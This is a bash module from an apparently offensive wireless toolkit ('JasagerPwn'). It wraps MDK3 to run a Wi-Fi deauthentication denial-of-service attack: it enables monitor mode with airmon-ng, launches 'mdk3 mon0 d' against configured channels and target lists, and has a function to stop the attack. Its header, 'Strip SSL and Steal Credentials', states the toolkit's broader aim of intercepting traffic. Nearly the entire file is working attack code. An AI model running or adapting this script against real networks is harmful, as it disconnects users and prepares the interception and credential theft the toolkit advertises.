#
# Strip SSL and Steal Credentials
#
# Author: Leg3nd @ https://leg3nd.me
#

################ Module Configuration ##
# Module Title
title="MDK3"
# Create a description for menu
description="MDK3 DeAuthentication DoS"
# Letter keys/commands to select item in menu
bindings="M|m"
#########################################

# Variables

# Start Function
function start_mdk3(){
  echo -e "\e[01;34m[>]\e[00m Starting MDK3 DeAuthentication Attack..."

  if [ ! "$(ifconfig  | grep mon0)" ]; then airmon-ng start ${deauth_interface} > /dev/null 2>&1 ; fi

  xterm -geometry 84x39+753+99 -fg red -bg black -T "[JasagerPwn] v${version} - MDK3 DeAuthentication" -e "mdk3 mon0 d -w /tmp/deauth.conf -c ${channels}" 1> /dev/null 2> /dev/null &
  pid_mdk3="$(echo $!)"

}

# Stop Function
function stop_mdk3(){
  echo -e "\e[01;34m[>]\e[00m Stopping MDK3 DeAuthentication Attack..."
  kill -9 ${pid_mdk3} > /dev/null 2>&1
}
